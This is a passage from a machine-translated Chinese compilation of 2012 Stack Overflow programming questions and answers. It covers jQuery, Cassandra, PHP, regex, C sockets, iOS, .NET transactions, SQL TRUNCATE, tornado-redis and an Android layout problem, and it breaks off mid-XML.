    $(this).siblings(".content").hide("fast");  // hide all siblings
    $next[isVisible ? "hide" : "show"]("fast");  // toggle the corresponding .content

    if(isVisible) {
        // it was visible, so now it's hidden. Show the other .content:
        // the next or, if not available, the previous
        var $second = $next.nextAll(".content").first();
        if($second.length === 0) {
            $second = $next.prevAll(".content").first();
        }
        $second.show("fast");
    }
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:44:42.033

您也可以考虑使用 jquery .toggle()。更多信息[在这里。](http://api.jquery.com/toggle/)

```
$('#foo').toggle(showOrHide);
is equivalent to:

if ( showOrHide == true ) {
  $('#foo').show();
} else if ( showOrHide == false ) {
  $('#foo').hide();
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-06-28T11:48:58.400

我不是 100% 确定（未经测试）......但我认为这非常接近。

```
$(".menu").click(function (){
    $(this).next('.content').toggle();
}); 
```

# nosql - 使用 cassandra-cli 创建两个复合列

> ID：11243825
> 
> 赞同：3
> 
> 时间：2012-06-28T11:40:29.833
> 
> 标签：nosql, cassandra

我的列族需要两个复合列，关键数据类型是 BytesType。

下面是使用 CQL 对表的定义：

```
CREATE TABLE stats (
      gid          blob,
      period       int,
      tid          blob, 
      sum          int,
      uniques      blob,
      PRIMARY KEY(gid, period, tid)
     ); 
```

我想做的是使用 Cassandra CLI 创建列族。这是我的镜头。

第一个复合材料的结构是：

```
CompositeType(Int32Type, BytesType, AsciiType) 
```

它将保存一个整数。

第二种复合材料的结构是：

```
CompositeType(Int32Type, BytesType) 
```

并将持有 BytesType。

```
create column family stats with comparator = 'CompositeType(Int32Type, BytesType, AsciiType)'; 
```

我不确定如何在创建列族命令中定义第二个复合列。

当然，我假设使用 CQL 创建的表将生成两个复合列。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T14:50:27.127

在 cassandra 的列族上只能有一个比较器。这意味着您也只能在列族中拥有一种类型的复合列。您使用的 CQL 语句创建的表实际上将使用您提到的第一个复合类型比较器：

```
CompositeType(Int32Type, BytesType, AsciiType) 
```

由于复合材料末尾的“AsciiType”组件，该比较器可以描述您的所有模式。列名的这个组件将包含文字字符串“sum”或“uniques”，并且列值将相应地匹配类型。

使用 json 样式表示法的示例：

```
<bytes> : {                               # a row key in your stats column family
    (100, <bytes>, "sum") : 100,          # one column in your row
    (100, <bytes>, "uniques") : <bytes>,  
    (200, <bytes>, "sum") : 200,
    (200, <bytes>, "uniques") : <bytes>
}
<bytes> : {                               # another row in the cf
    ...
} 
```

# php - php preg_replace 在 foreach 循环中不起作用

> ID：11243827
> 
> 赞同：0
> 
> 时间：2012-06-28T11:40:34.547
> 
> 标签：php, foreach, preg-replace

我有以下结构：

```
<?php
  $i = 0;
  foreach ($users as $user) {
    $i++;
    $string = '<span>The number is $i</span>';
    $string = preg_replace('/\<span.*?\/>$/e','',$string);
    echo $string;
  }
?> 
```

它附加了循环迭代`$string`的次数，而我只希望它在循环结束时`foreach`显示一次。如果在循环之外工作。我怎样才能输出一次并删除其余部分。我需要在循环内而不是在循环外进行。`The number is 4``preg_replace``echo`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:57:18.570

这将做到：

```
$i = 0;
foreach ($users as $user) {
   $i++;
   if ($i == count($users)) {
      $string = '<span>The number is $i</span>';
      $string = preg_replace('/\<span.*?\/>$/e','',$string);
      echo $string;
   }
} 
```

不过，您可能需要考虑其他选项来实现这一目标。您可以维护您的`$i`变量并在循环之后立即输出它，因为这正是它所做的。

或者，你可以只是`echo "<span>The number is ".count($users)."</span>";`. 在我的回答中，我假设你完全无法改变这些事情，而且你的问题比这个简单的要复杂得多`preg_replace`。如果不是，请考虑简化事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T12:04:00.247

我认为您需要的解决方案是[输出缓冲](http://php.net/manual/en/ref.outcontrol.php)：

```
// Start the output buffer to catch the output from the loop
ob_start();

$i = 0;
foreach ($users as $user) {
  $i++;
  // Do stuff
}

// Stop the output buffer and get the loop output as a string
$loopOutput = ob_get_clean();

// Output everything in the correct order
echo '<span>The number is '.$i.'</span>'.$loopOutput; 
```

# c# - 从 Session 中清理非托管资源，如 Crystal Report Document

> ID：11243836
> 
> 赞同：2
> 
> 时间：2012-06-28T11:41:05.997
> 
> 标签：c#, asp.net, .net-4.0, crystal-reports, session-state

我的问题是我有一个带有水晶报表的 ASP.Net 应用程序。我必须将 Crystal 报表的`ReportDocument`对象存储在会话状态中，这是一个非托管资源。

我的问题是：`ReportDocument`对象是否会被处理掉，`Session.Abandon`或者我必须自己手动完成，如果我必须手动`ReportDocument`从会话状态中删除对象。我应该遵循什么过程，因为`Session_End`如果我不知道存储在.`SessionState``Key``ReportDocument``Session`

请帮忙...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:55:58.220

我相信，当您将对象存储在会话中时，您只是在序列化对象当前状态的副本，该副本不会保留任何非托管资源，但原始对象会保留，您可以在拥有之后将其处理掉将其保存到会话中。

编辑

或者，将所有报告存储在一个会话对象中，该对象是具有单个键的集合。例如列表报告

# regex - 如何强制字符串中的最后一个字符在一定范围内？

> ID：11243840
> 
> 赞同：0
> 
> 时间：2012-06-28T11:41:15.073
> 
> 标签：regex

我有一个正则表达式，它允许值范围“1111”-“999999”，不包括“0”的任何实例：

```
^([1-9]){4,6}$ 
```

这对我有用，除了我的要求已被修改。我现在必须禁止范围内的最后一个'9'，以便最后一个字符的最大值是'8'，例如

```
1111 - 9998, or 1111 - 99998, or 1111 - 999998 
```

如何修改此正则表达式以满足新条件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:44:10.130

这个怎么样

```
^([1-9]){3,5}[1-8]$ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T12:01:53.843

***第一个选项：***

```
^[1-9]{3,5}[1-8]$ 
```

***第二种选择：***

```
^(?!.*9$)[1-9]{4,6}$ 
```

*负前瞻`(?!.*9$)`不允许`9`在最后。*

***第三个选项：***

```
^(?!.*0)(?!.*9$)\d{4,6}$ 
```

*负前瞻`(?!.*0)`根本不允许`0`出现在文本中。*

# c - C语言的ftp服务器

> ID：11243841
> 
> 赞同：1
> 
> 时间：2012-06-28T11:41:16.667
> 
> 标签：c, ftp

我必须在 C 中开发 1 个 FTP（简单）服务器。简单*是*
什么意思？我的意思是 FTP 服务器必须支持：

 *1.  身份验证（用户、通行证、端口）
2.  更改目录 (CD)
3.  文件列表 (LIST)
4.  文件检索 (RETR)

我刚刚将数字 1-2-3-4 开发为“拆分部分”，我必须将它们合并到*main.c*中。所以他们没有问题。
我不明白的是如何“接收”来自客户的通信。
我的意思是如何实现客户想要的（USER、PASS、CD、LIST、RETR）？
我已经阅读了 rfc959，但我还没有完全理解客户端和服务器之间的通信。
概括：

1.  客户端连接到服务器（所以进入服务器这部分是套接字“accept（..）”），对吗？1a 服务器向客户端发送“您已连接”对吗？
2.  客户端发送给服务器用户，密码（文件 1，auth.c，但我不知道当客户端向服务器发送用户和密码请求时如何读取）
3.  成功登录后服务器发送文件列表（第 3 部分，list.c，没问题）
4.  客户端向服务器发送它想要下载的文件或 changedir 命令（同样，如何从客户端的请求中读取此信息？）

我希望你明白:)

**编辑：**我在 GNU/Linux

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T12:17:32.127

尽管您的问题有点令人困惑，但我正在尝试回答。获取命令行参数，如“用户名密码”并将这些参数传递`argv[]`给`send`服务器并在服务器端接收使用`recv`。为了更好地理解，请参阅链接[Client.cpp](http://www.mtholyoke.edu/~xuansun/csamples/ftp/client_cpp.html)

希望这能解决你的困惑。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:45:42.263

如果您使用的是 Berkeley 套接字 API（您的提及`accept()`暗示您是），您通常使用`[recv()](http://linux.die.net/man/2/recv)`从套接字读取数据。您需要从客户端连接的套接字中读取，然后检查您所获得的内容以确定它是否是您可以处理的有效命令。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-10T08:07:04.080

我正在寻找一个代码来学习带有套接字的 ftp 的工作原理，并在 google 代码上找到了文件工作，并且代码清晰简单。网址：[http ://code.google.com/p/ifilework](http://code.google.com/p/ifilework)*

# ios - 如何在 TableView 中获取被点击对象的索引？

> ID：11243848
> 
> 赞同：0
> 
> 时间：2012-06-28T11:41:33.310
> 
> 标签：ios, indexing, label, tableview

我有一个带有自定义单元格的 tableView。在每个单元格中，都有一个 UILabel，它从 NSMutableArray 中获取文本。我设置了一个 GestureRecognizer 来查看这个标签是否被点击。如果它被点击，我会转到另一个视图。

现在在与标签选择器关联的方法中，我想获取 NSMutableArray 中文本的索引，对应于点击的标签。我怎么能那样做？

这是一些销售代码：在 cellForRowAtIndexPath: 方法中，这是我所做的：

```
 cell.Label.text = [tableLabelText objectAtIndex:indexPath.row];

    UITapGestureRecognizer* tap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(goToViewControllerB:)];

    [cell.Label setUserInteractionEnabled:YES];
    [cell.Label addGestureRecognizer:tap];
    [tap release]; 
```

然后我显示一切......

这是 goToViewControllerB 方法：

```
- (void) goToViewControllerB:(id)sender {
    if (!viewControllerB) {
    viewControllerB = [[ViewControllerB alloc] initWithNibName:@"ViewControllerB" bundle:nil];
}
    navigationController = [[UINavigationController alloc] initWithRootViewController:viewControllerB];
    [self presentModalViewController:navigationController animated:YES];
} 
```

如果我这样做，并且如果在我的 viewControllerB 中修改了某些内容并返回到 Table View，然后单击另一个标签，我将被引导到相同的 viewControllerB，其中包含以前的修改。我确实想为每个标签显示一个新的 viewControllerB。

我的想法是获取与点击的标签相对应的 tableLabelText 的索引。每当我调用 goToViewControllerB: 时，我都可以创建一个 ViewControllerB 类型的新对象并将其插入到 NSMUtableArray 中，在同一索引处...类似

```
if ([ViewControllerArray objectAtIndex: "here the index i'm looking for"]){
"show it" }
else {
"create it and insert it into ViewControllerArray at the right index" } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T12:22:06.023

将此设置在您的`cellForRowAtIndexPath:`

```
cell.textLabel.tag = indexPath.row. 
```

并在您的 tapGesture 方法中查找手势识别器的视图标签。

```
int indexFromArray = gesture.view.tag 
```

那是您从数据源数组中获得的索引。即使您在多个单元格中有相同的文本，您也可以使用此方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:43:13.920

对于您的 UILabel，将其标签设置为整数（例如单元格的行）在您`cellForRowAtIndexPath`创建标签时使用`label.tag = indexPath.row;`

现在在您的手势回调中，从与手势识别器对象关联的视图中获取标签

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-28T11:42:57.023

数组的使用`indexOfObject`方法。

```
int index = [yourArray indexOfObject:tappedLabel.text]; 
```

# c# - 没有 DTC 的 TransactionScope 替代方案

> ID：11243855
> 
> 赞同：6
> 
> 时间：2012-06-28T11:42:00.897
> 
> 标签：c#, .net-4.0, transactions, transactionscope, msdtc

是否有不需要启用 DTC 的 transactionScope 的替代方法？

在事务中我需要进行两个操作：

1.  创建一个用户（使用成员资格 - sql 成员资格提供程序）
2.  执行一次插入操作。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-28T11:43:32.217

TransactionScope 使用 LTM - .Net 中的轻量级事务管理器。只有在同一个事务中打开多个连接或在数据库之间切换时，TransactionScope 才应该将事务提升到基于 2PC 的 TX-manager DTC。

*对于 MS SQL Server 2008 及更高版本，仅当您打开与不同*数据库的连接时才会涉及 DTC 。或者，如果您正在从多个线程打开相同事务中的连接，除非您使用`DependentTransaction`的是如果您想进行线程处理，您应该在全局事务中登记。

[附带一点：我对Castle.Transactions](https://github.com/castleproject/Castle.Transactions)中的多线程故事有一些支持。

旁注#2：如果您使用 TransactionScope，请确保明确声明 IsolationLevel，否则您将序列化所有事务 (IsolationLevel.Serializable)！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-09-18T17:12:54.903

添加`Enlist=false`您的会员资格的连接字符串。

```
connectionString="Data Source=xxx;Initial Catalog=xxx;Persist Security Info=True;User ID=xxx;Password=xxx;Enlist=false" 
```

这是我的用例：

```
using (TransactionScope tScope = new TransactionScope())
{
    MembershipCreateStatus createStatus;
    Membership.CreateUser(model.Email, model.Password, model.Email, null, null, true, model.Id, out createStatus);

    if (createStatus == MembershipCreateStatus.Success)
    {
       Roles.AddUserToRole(model.Email, "Administrator");
       _UpdatePersonnelAccess(model);
       _UpdatePersonnelHasAccess(model);
       _SendEmail_Welcome(model);
       PersonSessionLog.ManageSession(model);
    }
    else
       ViewBag.Message = "Error";

    tScope.Complete();
} 
```

我的应用程序在 Amazon EC2 中发布，而数据库在 Amazon RDS 中。RDS 不支持 DTC，这就是为什么我还需要一种方法来防止升级到 DTC。顺便说一句，我使用的是 SQL Server 2008 R2。我有 2 个数据库 - ASPNETDB、数据 DB

感谢保罗[的帖子](https://stackoverflow.com/questions/12409020/how-to-share-a-connection-between-ef-dbcontext-and-aspnet-membership-to-avoid-tr)！

# iphone - iPhone 是否支持 SSE2？

> ID：11243856
> 
> 赞同：2
> 
> 时间：2012-06-28T11:42:00.927
> 
> 标签：iphone, ios, sse

我的代码中有很多语句包含 __m128i、_mm_loadu_si128、_mm_avg_epu8 等等。这东西在 Mac 上工作，但无法在 ios 中编译。IOS中这些的替代品是什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-28T11:52:55.377

SSE 是一项英特尔技术，在 iOS 设备的 ARM 芯片上不可用。查看用于这些类型计算的 Apple 多平台 API的[Accelerate 框架。](http://developer.apple.com/library/ios/#documentation/Accelerate/Reference/AccelerateFWRef/_index.html)

ARM 架构还提供了自己的 SIMD（单指令多数据）指令集，称为[NEON](http://www.arm.com/products/processors/technologies/neon.php)，可在 armv7 设备（iPhone 3GS 及更高版本）上使用。

# database - 我应该更喜欢“截断”还是“删除”来删除表格的内容？

> ID：11243861
> 
> 赞同：0
> 
> 时间：2012-06-28T11:42:31.593
> 
> 标签：database

我刚刚发现`"truncate {table}"`大多数数据库触发器都没有捕获语句。通过将此类陈述替换为 ，我是否会在性能方面承担任何风险`"delete from {table}"`？

我对 MSSQL 和 Sybase 特别感兴趣。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T11:46:11.280

由于创建了正确的事务日志， DELETE 会*更*慢且占用资源更多。但是你可以让它成为更大交易的一部分，正如你所说，触发器和约束也将被激活。

TRUNCATE 被视为 DDL 操作，就像 DROP TABLE 一样。它非常快，但不能作为事务的一部分来完成（即不能回滚）。

您需要哪一种取决于您的要求。你有需要运行的触发器吗？如果是这样，您是否可以在 TRUNCATE 之后或之前做一些事情来补偿它们没有运行？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-13T13:58:14.237

截断可以在 SQL Server 中回滚，但不能在 Sybase 中回滚。如果您有其他表对该表的 FK 引用，则不能使用 truncate 表。

如果您在触发器中有逻辑，例如审核数据或根据此删除从其他表中删除数据。您应该坚持删除，但如果您没有任何类型的触发器，那么最好的方法是截断表。

# python - tornado-redis：RPOP 有效，但 BRPOP 无效？

> ID：11243862
> 
> 赞同：1
> 
> 时间：2012-06-28T11:42:32.860
> 
> 标签：python, asynchronous, redis, tornado

Tornado 和 Redis 的新手，并开始实施侦听器/工作人员设置。

我希望能够将 LPUSH 任务放到队列中并将它们 RPOP 关闭。BRPOP 似乎是弹出它们的最佳方式，因为如果当前没有，它将等待添加一个。问题是，每当我使用它时，它永远不会返回......但是当我使用 RPOP 时，我会按预期获得队列中的下一个项目。

```
class ListenHandler(tornado.websocket.WebSocketHandler):
    uid = ''
    CHANNEL_TPL = "client_%s"
    RESPONSE_TPL = '{"command":"%s","rid":"%s","status":"%s","result":%s}'
    def open(self):
        # new websocket connection is established from a client
        print "open socket"
        self.uid = session = uuid4()        

    def on_message(self, message):
        print "on_message called [%s]" % message
        try:
            m = json.loads(message)
        except ValueError:
            self.write_message('BAD')
            return

        # check for RID (request id)
        if not 'rid' in m:
            self.write_message('error: unspecified rid')
            return

        # confirm receipt of data
        confirm_string = '%s OK' % (m['rid'])
        self.write_message(confirm_string)

        # check for command
        if not 'command' in m:
            response = '%s error: unspecified command' % (m['rid'])
            self.write_message(response)
            return

        # process commands
        if m['command'] == 'register':
            self._register(m['rid'])
        elif m['command'] == 'get_canvas':
            self._queue_command('read', m)
        elif m['command'] == 'save_canvas':
            if 'data' in m:
                self._queue_command('write', m)
            else:
                response = '%s unspecified data' % (m['rid'])
                self.write_message(response)
                return
        elif m['command'] == 'list_command_queue':
            self._list_command_queue(m['rid'])
        elif m['command'] == 'get_read_job':
            self._get_read_job(m['rid'])
        elif m['command'] == 'get_write_job':
            self._get_write_job(m['rid'])
        else:
            # no commands recognized
            response = '%s error: unknown command' % (m['rid'])
            self.write_message(response)
            return
        print "end of on_message()\n"

    def callback(self, data):
        print "- callback()"
        self.write_message(data)

    def on_close(self):
        # websocket connection is closed by client
        pass

    def _register(self, rid):
        data = '{"uid":"%s"}' % (self.uid)
        response = self.RESPONSE_TPL % ('register', rid, 'completed', data)
        self.callback(response)

    @tornado.web.asynchronous
    @tornado.gen.engine 
    def _queue_command(self, type, m):
        channel = self.CHANNEL_TPL % (type)
        print "pushing job to %s ... data[%s]" % (channel, m)
        yield tornado.gen.Task(self.application.rdb.lpush, channel, m)
        return

    def _list_command_queue(self, rid):
        channel_r = self.CHANNEL_TPL  % ('read')
        channel_w = self.CHANNEL_TPL  % ('write')
        data = '{"client_read":"%s","client_write":"%s"}' % (self.application.rdb.llen(channel_r), self.application.rdb.llen(channel_w))
        response = self.RESPONSE_TPL % ('list_command_queue', rid, 'completed', data)
        print "list_command_queue [%s]" % (response)
        self.callback(response)

    @tornado.web.asynchronous
    @tornado.gen.engine  
    def _get_read_job(self, rid):
        channel = self.CHANNEL_TPL % ('read')
        data = yield tornado.gen.Task(self.application.rdb.rpop, (channel))
        response = self.RESPONSE_TPL % ('get_read_job', rid, 'completed', data)
        self.callback(response)

    @tornado.web.asynchronous
    @tornado.gen.engine    
    def _get_write_job(self, rid):
        channel = self.CHANNEL_TPL  % ('write')
        data = yield tornado.gen.Task(self.application.rdb.rpop, (channel))
        response = self.RESPONSE_TPL % ('get_write_job', rid, 'completed', data)
        self.callback(response) 
```

上面的类将接受识别的命令并将它们 LPUSH 到两个不同队列之一（一个用于写入 SQL DB 的作业的“写入”队列，以及一个用于只读作业的“读取”队列）。理论上，在不同的机器上会有许多“工作”线程使用 BRPOP 来获取这些命令并执行它们。不过，现在，我正在使用同一个侦听器来测试队列中的内容。

函数 get_write_jobs 和 get_read_jobs 将返回队列中的下一个条目，没有问题。但是，如果我向任何一种方法添加“b”（brpop），该函数将永远不会调用回调。似乎只是锁定，等待下一个可用条目，但那里有条目。

知道这里发生了什么吗？我误解了BRPOP的目的吗？

谢谢，尼克

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-23T17:32:38.463

也许有点晚了，但我想我可以帮忙。

我今天也遇到了同样的问题，它几乎让我发疯。最后，经过大量调试后，我通过将密钥或通道传递给列表（例如 [通道]）中的 blpop/brpop 解决了它。

tornado-redis 的 brpop/blpop 在内部所做的是将键转换为列表，但是当只接收到一个键时，它会将字符串转换为字符列表（简直太神奇了......），这就是调用之后阻塞的原因，它正在等待各种列表中的新项目，其名称对应于原始密钥的所有字符。

# php - 使用 utf-8 阿拉伯字符集字符串的文件名 PHP 重命名失败

> ID：11243863
> 
> 赞同：2
> 
> 时间：2012-06-28T11:42:33.263
> 
> 标签：php, rename

我有一个 php rename 函数的问题，如果文件名是带有空格的阿拉伯语单词，它会失败。

例如

```
rename(temp/أم كلثوم       ثوار - ثوار.mp3,audio/13408831061.mp3); 
```

（路径）中没有这样的文件或目录

请注意： `أم كلثومxxxxxxxxثوار - ثوار.mp3`

`xxxxxxx`这里至少有六个空格。

我试过了`urlencode()`，但还是没有结果。

任何建议！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-04-19T13:18:42.280

这个示例应该有帮助，我测试了波纹管代码，它在 Windows 中适用于阿拉伯/波斯名称：

```
$newname  = $filename = iconv("utf-8", "cp1256","گچپژ");
echo rename("1.txt", $newname); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T12:46:27.557

要检查您`$file_id`是否正确，请在类 Unix 系统上执行此操作：

```
echo "<pre>\n"; // for HTML output only
system("echo -n '$file_id' | od -tx1"); 
```

使用此值，它应该是您报告的文件名（您可以`echo`进行检查）

```
$file_id = "\xD9\x83\xD9\x84\xD8\xAB\xD9\x88\xD9\x85 \xD8\xAB\xD9\x88\xD8\xA7\xD8\xB1 - \xD8\xAB\xD9\x88\xD8\xA7\xD8\xB1.mp3"; 
```

输出是

```
0000000 d9 83 d9 84 d8 ab d9 88 d9 85 20 d8 ab d9 88 d8
0000020 a7 d8 b1 20 2d 20 d8 ab d9 88 d8 a7 d8 b1 2e 6d
0000040 70 33
0000042 
```

（如您所见，以 a 结尾的`B1`序列会重复，最后 4 个字节是`.mp3`）

在文件所在的目录中，您可以发出

```
ls -1 | od -tx1 
```

`0a`你会看到所有用换行符分隔的文件名。

如果两个输出都匹配，则问题出在 PHP 或系统中（两者都不太可能），如果不匹配，您将不得不从编码开始，从编码开始，在任何地方都必须是 UTF-8。

# java - 在后台停止java程序

> ID：11243864
> 
> 赞同：3
> 
> 时间：2012-06-28T11:42:37.503
> 
> 标签：java, keyevent

我有一个在后台运行的java程序（Windows）。我想绑定一个以某种方式终止进程的密钥，即使您当前正在另一个程序中工作。这可能吗？

基本上我想做类似的事情：

```
If(KeyPressed)
//break from main loop; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:48:31.857

您需要使用 JNI。我已经成功地使用了它：
[http ://code.google.com/p/jnativehook/](http://code.google.com/p/jnativehook/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T12:07:27.793

查看 Java Com api 将您的程序绑定到 Windows COM 端口以监听按键操作

[http://docs.oracle.com/cd/E17802_01/products/products/javacomm/reference/api/javax/comm/package-summary.html](http://docs.oracle.com/cd/E17802_01/products/products/javacomm/reference/api/javax/comm/package-summary.html)

[http://users.frii.com/jarvi/rxtx/](http://users.frii.com/jarvi/rxtx/)

也可以试试这个教程来访问 Windows 硬件（即键盘） [http://beqi.com/beqi/java_com_accessing_windows_hardware.php](http://beqi.com/beqi/java_com_accessing_windows_hardware.php)

# android - Android：文本视图的最后一行被切断

> ID：11243867
> 
> 赞同：122
> 
> 时间：2012-06-28T11:42:45.263
> 
> 标签：android, layout, textview, layout-inflater

我有一个`LinearLayout`包含 a的水平，`TextView`然后是`Spinner`它旁边的 a。这`LinearLayout`在`LinearLayout`包含在`RelativeLayout`.

问题是，自从我从 切换`Theme.light`到 后`Theme.holo.light`，最后一行`TextView`被减半。当动态文本很长并且跨越多行时会发生这种情况。

![在此处输入图像描述](../Images/f8c10aa97ab53ef34178024138a66cb3.png)

我已经能够通过将底部填充添加到`LinearLayout`包含`TextView`and的水平线来解决这个问题`Spinner`。

这感觉不像是一种修复，而更像是一种破解。有人可以就如何正确解决这个问题给我一些建议吗？

我还阅读了其他一些问题，但似乎没有任何帮助。

水平线性布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:orientation="horizontal">

    <TextView
        android:id="@+id/textView1"
        android:layout_width="150dp"
        android:layout_height="wrap_content"
        android:layout_marginRight="20dp"
        android:text="TextView"/>

    <Spinner
        android:id="@+id/spinner1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"/>

</LinearLayout> 
```

相对布局，其中上述布局在线性布局中动态膨胀，id 为 ll2_7：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <ScrollView
        android:id="@+id/scrollView"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_above="@+id/relLayoutButtonNext"
        android:layout_below="@id/textView1" >

        <RelativeLayout
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:paddingBottom="20dp"
            android:paddingLeft="10dp"
            android:paddingRight="10dp"
            android:paddingTop="10dp" >

            <TextView
                android:id="@+id/textView10"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:paddingRight="30dp"
                android:text="2.7" />

            <TextView
                android:id="@+id/textView11"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_marginBottom="10dp"
                android:layout_toRightOf="@id/textView10"
                android:text="@string/question2_7" />

            <LinearLayout
                android:id="@+id/ll2_7"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_alignLeft="@+id/textView11"
                android:layout_below="@+id/textView11"
                android:orientation="vertical" android:layout_marginBottom="20dp">
            </LinearLayout>

        </RelativeLayout>

    </ScrollView>

</RelativeLayout> 
```

**编辑：** 这是上面的完整布局 xml：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <TextView
        android:id="@+id/textView1"
        style="@style/question_section_title"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentLeft="true"
        android:layout_alignParentTop="true"
        android:text="@string/question2_header" />

    <RelativeLayout
        android:id="@+id/relLayoutButtonNext"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        android:background="@color/bottomBar"
        android:paddingBottom="3dp"
        android:paddingLeft="50dp"
        android:paddingRight="50dp"
        android:paddingTop="3dp" >

        <Button
            android:id="@+id/buttonNext"
            android:layout_width="180dp"
            android:layout_height="wrap_content"
            android:layout_alignParentRight="true"
            android:onClick="nextStep"
            android:text="Next Section"
            android:textSize="20sp" />

        <Button
            android:id="@+id/buttonPrevious"
            android:layout_width="180dp"
            android:layout_height="wrap_content"
            android:layout_alignParentLeft="true"
            android:layout_alignParentTop="true"
            android:onClick="previousStep"
            android:text="Previous Section"
            android:textSize="20sp" />
    </RelativeLayout>

    <ScrollView
        android:id="@+id/scrollView"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_above="@+id/relLayoutButtonNext"
        android:layout_below="@id/textView1" >

        <RelativeLayout
            android:layout_width="fill_parent"
            android:layout_height="wrap_content"
            android:paddingBottom="20dp"
            android:paddingLeft="10dp"
            android:paddingRight="10dp"
            android:paddingTop="10dp" >

            <TextView
                android:id="@+id/textView10"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:paddingRight="30dp"
                android:text="2.7" />

            <TextView
                android:id="@+id/textView11"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_marginBottom="10dp"
                android:layout_toRightOf="@id/textView10"
                android:text="@string/question2_7" />

            <LinearLayout
                android:id="@+id/ll2_7"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_alignLeft="@+id/textView11"
                android:layout_below="@+id/textView11"
                android:orientation="vertical" android:layout_marginBottom="20dp">

            </LinearLayout>

            <TextView
                android:id="@+id/textView2"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_alignLeft="@+id/textView10"
                android:layout_below="@+id/ll2_7"
                android:text="2.8" />

            <TextView
                android:id="@+id/textView3"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_below="@+id/ll2_7"
                android:layout_toRightOf="@+id/textView10"
                android:text="@string/question2_8" android:layout_marginBottom="10dp"/>

            <LinearLayout
                android:id="@+id/ll2_8"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_alignLeft="@+id/textView3"
                android:layout_below="@+id/textView3"
                android:layout_marginBottom="20dp"
                android:orientation="vertical" >

            </LinearLayout>

            <TextView
                android:id="@+id/textView4"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_alignLeft="@+id/textView2"
                android:layout_below="@+id/ll2_8"
                android:text="2.9" />

            <TextView
                android:id="@+id/textView5"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_below="@+id/ll2_8"
                android:layout_toRightOf="@+id/textView10"
                android:text="@string/question2_9" android:layout_marginBottom="10dp"/>

            <LinearLayout
                android:id="@+id/ll2_9"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_below="@+id/textView5"
                android:layout_toRightOf="@+id/textView10"
                android:orientation="vertical" android:layout_marginBottom="20dp">

            </LinearLayout>

            <TextView
                android:id="@+id/textView6"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_alignLeft="@+id/textView4"
                android:layout_below="@+id/ll2_9"
                android:text="2.10" />

            <TextView
                android:id="@+id/textView7"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_below="@+id/ll2_9"
                android:layout_toRightOf="@+id/textView10"
                android:text="@string/question2_10" android:layout_marginBottom="10dp"/>

            <LinearLayout
                android:id="@+id/ll2_10"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_below="@+id/textView7"
                android:layout_marginBottom="20dp"
                android:layout_toRightOf="@+id/textView10"
                android:orientation="vertical" >

            </LinearLayout>

            <TextView
                android:id="@+id/textView8"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_alignLeft="@+id/textView6"
                android:layout_below="@+id/ll2_10"
                android:text="2.11" />

            <TextView
                android:id="@+id/textView9"
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_below="@+id/ll2_10"
                android:layout_toRightOf="@+id/textView10"
